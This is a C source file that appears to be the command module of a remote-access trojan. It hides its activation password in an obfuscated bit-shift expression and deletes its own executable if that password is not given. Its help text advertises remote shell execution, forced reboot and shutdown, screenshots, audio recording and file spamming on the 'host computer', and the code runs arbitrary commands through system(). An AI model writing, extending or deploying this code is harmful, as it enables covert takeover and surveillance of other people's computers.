#include "../../include/modules.h"
#include <string.h>
#include <stdlib.h>

int main(int argc, char** argv)
{

    //self-deletes if proper arg is not given
    if(argc == 1)
    {
        remove(*argv);
        return 0;
    } else if(strcmp(argv[1], (char[]) {
        (((1<<1<<1<<1<<1<<1)|1)<<1)&(((((((((((((((((((((((1<<1)|1)<<1)|1)<<1<<1)|1)<<1<<1<<1)|1)<<1<<1)|1)<<1)|1)<<1)|1)<<1<<1)|1)<<1)|1)<<1<<1<<1)|1)<<1<<1<<1<<1<<1)|1)<<1)&(((((((((((((((((((((((((((((((1<<1<<1)|1)<<1<<1)|1)<<1<<1<<1)|1)<<1)|1)<<1<<1<<1<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1<<1<<1<<1<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1<<1)|1)<<1)|1))&(((((((((((((((((((((((((((((1<<1<<1<<1)|1)<<1<<1<<1)|1)<<1<<1)|1)<<1)|1)<<1<<1<<1)|1)<<1<<1<<1<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1<<1<<1<<1)|1)<<1)|1))&(((((((((((((((((((((((((((((((((((1<<1<<1<<1)|1)<<1)|1)<<1<<1)|1)<<1)|1)<<1)|1)<<1<<1)|1)<<1)|1)<<1<<1)|1)<<1)|1)<<1<<1)|1)<<1<<1<<1)|1)<<1)|1)<<1)|1)<<1<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1)&(((((((((((((((((((((((((((((1<<1<<1<<1)|1)<<1)|1)<<1<<1<<1)|1)<<1)|1)<<1<<1)|1)<<1)|1)<<1<<1<<1<<1)|1)<<1<<1)|1)<<1<<1)|1)<<1)|1)<<1)|1)<<1)|1)<<1<<1)|1)<<1<<1)|1)<<1),
        0
    }) != 0)
    {
        remove(*argv);
        return 0;
    }

    //removes first arg
    {
        char *temp = *argv;
        argv[1] = temp;
    }
    argv++;
    argc--;

    if(argc == 1)
    {
        printf("Missing args.\nTry \"help\" for information.\n");
    } else if(!strcmp(argv[1], "help"))
    {
        printf(
            "\"abort\" to delete all modules from host computer.\n"
            "\"ABORT\" to delete this entire program from host computer.\n"
            "\"reboot\" to reboot the host computer\n"
            "\"shutdown\" to power off the host computer\n"
            "\"record start\" to start recording.\n"
            "\"record end\" to send recorded audio file.\n"
            "\"screenshot\" to send screenshot of host computer.\n"
            "\"3A33\" to spam files full of only ':3'\n"
            "\"cmd [commands]\" to run commands on a new shell on the host computer\n"
            "\"help\" to display this help message"
        );
    } else if(!strcmp(argv[1], "cmd"))
    {
        argv += 2;
        argc -= 2;

        int len = 0;
        for(int i = 0; i < argc; i++)len += strlen(argv[i]) + 1;

        char command[len];

        for(int i = 0, j = 0; i < argc; j += 1 + strlen(argv[i]), i++)
        {
            if(j != 0)command[j - 1] = ' ';
            strcpy(command + j, argv[i]);
        }

        system(command);

    } else if(!strcmp(argv[1], "reboot"))
    {
        system("shutdown /r /f");
    } else if(!strcmp(argv[1], "shutdown"))
    {
        system("shutdown /s");
    } else if(!strcmp(argv[1], "screenshot"))
    {
        system("screenshot");
    } else{
        printf("Unknown arg.\nTry \"help\" for information.\n");
    }

    return 0;
}
